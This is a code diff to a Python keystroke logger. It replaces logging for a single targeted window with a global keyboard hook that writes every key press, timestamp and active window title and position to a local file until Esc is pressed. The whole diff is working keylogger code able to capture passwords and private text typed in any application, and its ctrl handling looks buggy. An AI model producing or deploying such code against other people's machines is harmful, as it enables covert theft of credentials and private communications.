@@ -1,45 +1,47 @@
-import pygetwindow as gw
 import pyautogui
 import keyboard
 import time
 
-def log_keystrokes(window):
-    with open('logfile.txt', 'a') as f:
-        f.write(f"Window Title: {window.title}\n")
-        f.write(f"Window Position: ({window.left}, {window.top})\n")
-        f.write("Keystrokes:\n")
+current_window = None
 
-        while True:
-            key_event = keyboard.read_event()
-            if key_event.event_type == keyboard.KEY_DOWN:
-                key_time = time.time()
-                if key_event.name == 'enter':
-                    f.write('\n')
-                elif key_event.name == 'space':
-                    f.write(f"[{key_time:.3f}]space\n")
-                elif key_event.name == 'backspace':
-                    f.write(f"[{key_time:.3f}]lbackspace\n")
-                elif key_event.name == 'ctrl':
-                    # Handling Ctrl+C as a special case
-                    next_key_event = keyboard.read_event()
-                    if next_key_event.event_type == keyboard.KEY_DOWN and next_key_event.name == 'c':
-                        f.write(f"[{key_time:.3f}]ctrlc\n")
-                    else:
-                        f.write(f"[{key_time:.3f}]ctrl\n")
-                        keyboard.write(key_event.name)  # Write the Ctrl key without Ctrl+C
+def log_keystrokes(event):
+    global current_window
+
+    if event.event_type == keyboard.KEY_DOWN:
+        key_time = time.time()
+        with open('logfile.txt', 'a') as f:
+            active_window = pyautogui.getActiveWindow()
+
+            if current_window != active_window:
+                # If the active window has changed, update window information
+                current_window = active_window
+                f.write(f"\nWindow Title: {current_window.title}\n")
+                f.write(f"Window Position: ({current_window.left}, {current_window.top})\n")
+                f.write("Keystrokes:\n")
+
+            if event.name == 'enter':
+                f.write('\n')
+            elif event.name == 'space':
+                f.write(f"[{key_time:.3f}]space\n")
+            elif event.name == 'backspace':
+                f.write(f"[{key_time:.3f}]lbackspace\n")
+            elif event.name == 'ctrl':
+                # Handling Ctrl+C as a special case
+                next_key_event = keyboard.read_event()
+                if next_key_event.event_type == keyboard.KEY_DOWN and next_key_event.name == 'c':
+                    f.write(f"[{key_time:.3f}]ctrlc\n")
                 else:
-                    f.write(f"[{key_time:.3f}]{key_event.name}\n")
-                f.flush()
+                    f.write(f"[{key_time:.3f}]ctrl\n")
+                    keyboard.write(event.name)  # Write the Ctrl key without Ctrl+C
+            else:
+                f.write(f"[{key_time:.3f}]{event.name}\n")
+            f.flush()
 
-if __name__ == "__main__":
-    target_window_title = "TODO"  # Replace with your target window title
+keyboard.hook(log_keystrokes)
 
-    try:
-        notepad_window = gw.getWindowsWithTitle(target_window_title)[0]
-        print(f"Found window: {notepad_window.title}")
-
-        log_keystrokes(notepad_window)
-    except IndexError:
-        print("Window not found.")
-    except KeyboardInterrupt:
-        print("Logging stopped.")
+try:
+    keyboard.wait('esc')  # Wait for the 'esc' key to exit the script
+except KeyboardInterrupt:
+    pass
+finally:
+    keyboard.unhook_all()  # Unhook all hooks when the script exits
